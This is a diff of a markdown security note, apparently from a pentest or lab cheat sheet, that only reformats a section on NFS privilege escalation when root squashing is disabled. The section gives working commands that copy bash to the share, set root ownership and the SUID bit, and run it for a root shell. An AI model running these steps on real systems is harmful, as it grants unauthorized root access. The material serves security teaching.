@@ -102,14 +102,17 @@ ___
 NFS often enables root squashing by default, which maps root user requests to a non-privileged user. If disabled, attackers can create files with the SUID bit (means The files can be run with the permissions of the file(s) owner/group.), granting root access.
 
 #### Exploitation Steps
-1.  **Copy a Malicious Binary**: Copy a bash binary to the NFS share and set its owner to root.
+1. **Copy a Malicious Binary**: Copy a bash binary to the NFS share and set its owner to root.
    
 ``sudo cp /bin/bash /tmp/mount/
-
 sudo chown root:root /tmp/mount/bash``
+
 2. **Set the SUID Bit**: Add SUID permission to the binary.
 
+
 ``sudo chmod +s /tmp/mount/bash``
+
+
 3. **Execute as Root**: Run the binary with elevated privileges.
   
 ``./bash -p``
